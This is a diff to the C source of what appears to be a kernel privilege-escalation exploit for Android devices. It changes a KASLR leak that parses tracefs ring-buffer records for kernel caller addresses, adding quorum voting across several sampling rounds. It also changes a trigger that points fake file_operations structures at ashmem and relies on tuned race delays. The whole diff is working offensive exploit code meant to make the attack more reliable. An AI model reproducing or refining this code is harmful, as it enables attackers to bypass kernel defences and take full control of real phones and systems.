@@ -201,6 +201,12 @@ static const uint64_t slide_max_offset = 0x3f8000ULL;
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
 #define SLIDE_TRACEFS_CANDIDATES 128
+/* Quorum threshold for the APP voter. Targets that care define
+ * SLIDE_TRACEFS_MIN_VOTES in their target.h (FZG1: 2); the root-umh
+ * voter in slide.c independently defaults to 3. */
+#ifndef SLIDE_TRACEFS_MIN_VOTES
+#define SLIDE_TRACEFS_MIN_VOTES 2
+#endif
 static unsigned int slide_tracefs_raw_pages;
 static unsigned int slide_tracefs_raw_bytes;
 static unsigned int slide_tracefs_raw_events;
@@ -378,11 +384,17 @@ static int slide_tracefs_parse_page(const unsigned char *page,
       }
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
-      if (slide_tracefs_raw_callers < 8) {
+      if (slide_tracefs_raw_callers < 64) {
         pr_info("slide tracefs raw caller=%016llx event=%u len=%zu\n",
                 (unsigned long long)caller, event_id, record_len);
       }
       slide_tracefs_raw_callers++;
+      /* Single primary anchor only. Multi-anchor voting was tried and
+       * reverted: every caller votes once PER anchor, so a single-callsite
+       * workload ties N-N between the true slot and its anchor-delta ghost
+       * (A1-A2 = 0xA8000, observed 15-15), unresolvable by counts. A1 is
+       * the only anchor with confirmed slides (0x8000/0x18000/0xb8000/
+       * 0xd0000); auxiliary anchors stay defined for forensics. */
       static const uint64_t link_callers[] = {
         KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF,
 #ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
@@ -519,6 +531,8 @@ static int slide_tracefs_leak_kernel_base(void) {
   int cpu_files = 0;
   int candidate_count = 0;
   uintptr_t candidate = 0;
+  unsigned best_hits = 0;
+  unsigned second_hits = 0;
 
   if (!slide_tracefs_read_u32(tracing_on, &old_tracing) ||
       !slide_tracefs_read_u32(event_enable, &old_event) ||
@@ -534,6 +548,24 @@ static int slide_tracefs_leak_kernel_base(void) {
   restore_needed = 1;
   pr_info("slide tracefs state tracing=%u event=%u id=%u\n",
           old_tracing, old_event, event_id);
+  /* In-process retry: sampling costs nothing (no one-shot consumed) and
+   * the blocked-task mix varies per round (single-callsite rounds carry
+   * no quorum information). */
+  for (int trace_round = 1; trace_round <= 3; trace_round++) {
+    pr_info("slide tracefs round=%d/3\n", trace_round);
+    scan_ok = 1;
+    slide_tracefs_raw_pages = 0;
+    slide_tracefs_raw_bytes = 0;
+    slide_tracefs_raw_events = 0;
+    slide_tracefs_raw_callers = 0;
+    slide_tracefs_parse_failures = 0;
+    cpu_files = 0;
+    candidate_count = 0;
+    candidate = 0;
+    best_hits = 0;
+    second_hits = 0;
+    memset(slide_tracefs_candidate_hits, 0,
+           sizeof(slide_tracefs_candidate_hits));
   if (!slide_tracefs_write(tracing_on, "0") ||
       !slide_tracefs_write(event_enable, "0") ||
       !slide_tracefs_clear(trace) ||
@@ -557,13 +589,7 @@ static int slide_tracefs_leak_kernel_base(void) {
              errno);
     goto out;
   }
-  slide_tracefs_raw_pages = 0;
-  slide_tracefs_raw_bytes = 0;
-  slide_tracefs_raw_events = 0;
-  slide_tracefs_raw_callers = 0;
-  slide_tracefs_parse_failures = 0;
-  memset(slide_tracefs_candidate_hits, 0,
-         sizeof(slide_tracefs_candidate_hits));
+  /* Per-round counters were reset at the loop top; parse accumulates. */
   for (int cpu = 0; cpu < cpu_count; cpu++) {
     char path[128];
     snprintf(path, sizeof(path),
@@ -608,6 +634,7 @@ static int slide_tracefs_leak_kernel_base(void) {
       scan_ok = 0;
     }
   }
+  /* best/second reset at the loop top; evaluate accumulated hits. */
   for (size_t slot = 0; slot < SLIDE_TRACEFS_CANDIDATES; slot++) {
     if (!slide_tracefs_candidate_hits[slot]) {
       continue;
@@ -615,19 +642,37 @@ static int slide_tracefs_leak_kernel_base(void) {
     uintptr_t slot_candidate = slot << 15;
     pr_info("slide tracefs candidate=%08zx hits=%u\n",
             slot_candidate, slide_tracefs_candidate_hits[slot]);
-    candidate = slot_candidate;
+    if (slide_tracefs_candidate_hits[slot] > best_hits) {
+      second_hits = best_hits;
+      best_hits = slide_tracefs_candidate_hits[slot];
+      candidate = slot_candidate;
+    } else if (slide_tracefs_candidate_hits[slot] > second_hits) {
+      second_hits = slide_tracefs_candidate_hits[slot];
+    }
     candidate_count++;
   }
   pr_info("slide tracefs raw summary pages=%u bytes=%u events=%u callers=%u parse_fail=%u candidates=%d cpu_files=%d\n",
           slide_tracefs_raw_pages, slide_tracefs_raw_bytes,
           slide_tracefs_raw_events, slide_tracefs_raw_callers,
           slide_tracefs_parse_failures, candidate_count, cpu_files);
+  /* Quorum (reference semantics from slide.c): the best slot must clear
+   * MIN_VOTES and STRICTLY exceed the runner-up. Ghost slots sit exactly
+   * one anchor-delta away (A1-A2 = 0xA8000) and tie a symmetric split, so
+   * ties fail closed (reboot + resample) instead of coin-flipping KASLR. */
   if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
-      candidate_count != 1) {
-    pr_warning("slide tracefs candidate gate failed\n");
-    goto out;
+      !candidate_count || best_hits < (unsigned)SLIDE_TRACEFS_MIN_VOTES ||
+      best_hits == second_hits) {
+    pr_info("slide tracefs round=%d no quorum best=%u second=%u "
+            "slots=%d; retrying\n",
+            trace_round, best_hits, second_hits, candidate_count);
+    sleep(1);
+    continue;
   }
+  pr_info("slide tracefs quorum best=%08zx hits=%u second=%u slots=%d\n",
+          candidate, best_hits, second_hits, candidate_count);
   setup_ok = 1;
+  break;
+  }
 
 out:
   if (restore_needed) {
@@ -2267,9 +2312,22 @@ static int app_trigger_fops_slide_slot(size_t slot) {
     70000, 60000, 80000, 40000, 90000, 50000,
     30000, 20000, 75000, 65000, 85000, 55000,
   };
+#if defined(APP_CLOSED_FOPS_ROUTE) && APP_CLOSED_FOPS_ROUTE && \
+    !defined(APP_FOPS_REUSE_VERIFIED_PAGE)
+  /* CLOSED production keeps its proven direct geometry bit-for-bit
+   * (fake_* globals from the non-banked FOPS construction). Only the
+   * alias-verifier slots (probe active) go through the bank. */
+  if (slot == 0 && !fops_data_probe_active) {
+    slide_oracle_parent = fake_fops;
+    slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
+  } else if (!select_slide_payload_index(slot)) {
+    return 0;
+  }
+#else
   if (!select_slide_payload_index(slot)) {
     return 0;
   }
+#endif
   int delay = 0;
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   int forced_delay = slide_s928_fops_delay_override(&delay);
